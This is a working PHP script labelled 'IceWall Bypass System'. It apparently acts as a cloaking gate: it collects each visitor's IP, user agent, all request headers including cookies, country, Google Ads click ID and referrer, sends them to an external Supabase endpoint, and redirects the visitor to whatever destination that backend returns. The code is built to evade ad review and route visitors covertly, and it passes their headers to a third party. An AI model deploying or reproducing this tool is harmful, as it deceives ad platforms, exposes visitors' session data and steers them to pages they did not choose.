<?php
/**
 * IceWall Bypass System - External Validation
 * Protected Domain: https://223332.com
 * Created: 2025-12-13T09:42:50.099Z
 * Version: v7.1.0
 */

error_reporting(0);
ini_set('display_errors', 0);

// Filtrar requisições de assets estáticos para evitar logs duplicados
$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$ignoredPaths = [
    '/favicon.ico',
    '/robots.txt',
    '/sitemap.xml',
    '/.well-known/',
];

$ignoredExtensions = [
    '.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico',
    '.woff', '.woff2', '.ttf', '.eot', '.otf', '.webp', '.mp4', '.webm',
    '.pdf', '.zip', '.xml', '.json', '.txt'
];

// Ignora requisições de assets estáticos
foreach ($ignoredPaths as $path) {
    if (strpos($requestUri, $path) !== false) {
        http_response_code(404);
        exit;
    }
}

foreach ($ignoredExtensions as $ext) {
    if (substr($requestUri, -strlen($ext)) === $ext) {
        http_response_code(404);
        exit;
    }
}

function getClientIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            return trim($ips[0]);
        }
    }
    return 'unknown';
}

function getAllHeaders() {
    $headers = [];
    foreach ($_SERVER as $key => $value) {
        if (strpos($key, 'HTTP_') === 0) {
            $header = str_replace('HTTP_', '', $key);
            $header = str_replace('_', '-', $header);
            $headers[$header] = $value;
        }
    }
    return $headers;
}

function generateUUIDv4() {
    $data = random_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

$paramKey = '_544b33d49337';
$validationUrl = 'https://oamktcbohqszeqbhilhq.supabase.co/functions/v1/ice-wall-backend/validate';

$requestId = generateUUIDv4();

$country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'UNKNOWN';
$countrySource = !empty($_SERVER['HTTP_CF_IPCOUNTRY']) ? 'CF-IPCOUNTRY' : 'NONE';

$gclid = $_GET['gclid'] ?? null;
$referrer = $_SERVER['HTTP_REFERER'] ?? null;

$payload = json_encode([
    'request_id' => $requestId,
    'param_key' => $paramKey,
    'ip' => getClientIP(),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    'headers' => getAllHeaders(),
    'country' => $country,
    'country_source' => $countrySource,
    'gclid' => $gclid,
    'referrer' => $referrer
]);

$ch = curl_init($validationUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode === 200 && $response) {
    $data = json_decode($response, true);
    if ($data && isset($data['decision']) && isset($data['destination'])) {
        header('Location: ' . $data['destination']);
        exit;
    }
}

header('Location: https://222.com');
exit;
?>